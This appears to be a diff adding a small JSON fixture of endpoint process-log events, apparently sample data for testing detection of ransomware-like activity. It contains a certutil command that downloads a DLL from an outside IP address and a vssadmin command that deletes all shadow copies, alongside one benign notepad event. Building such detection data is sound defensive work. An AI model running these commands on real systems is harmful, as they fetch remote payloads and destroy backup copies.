@@ -1,0 +1,50 @@
+[
+  {
+    "@timestamp": "2026-11-16T09:12:31.055Z",
+    "host": {
+      "name": "WS-FIN-07"
+    },
+    "user": {
+      "name": "j.alvarez"
+    },
+    "process": {
+      "executable": "C:\\Windows\\System32\\certutil.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://203.0.113.50/k.dll C:\\Users\\Public\\k.dll",
+      "parent": {
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-11-16T09:29:05.276Z",
+    "host": {
+      "name": "WS-FIN-07"
+    },
+    "user": {
+      "name": "SYSTEM"
+    },
+    "process": {
+      "executable": "C:\\Windows\\System32\\vssadmin.exe",
+      "command_line": "vssadmin.exe Delete Shadows /All /Quiet",
+      "parent": {
+        "executable": "C:\\Windows\\System32\\cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-11-16T09:30:00.000Z",
+    "host": {
+      "name": "WS-HR-02"
+    },
+    "user": {
+      "name": "m.chen"
+    },
+    "process": {
+      "executable": "C:\\Windows\\System32\\notepad.exe",
+      "command_line": "notepad.exe notes.txt",
+      "parent": {
+        "executable": "C:\\Windows\\explorer.exe"
+      }
+    }
+  }
+]
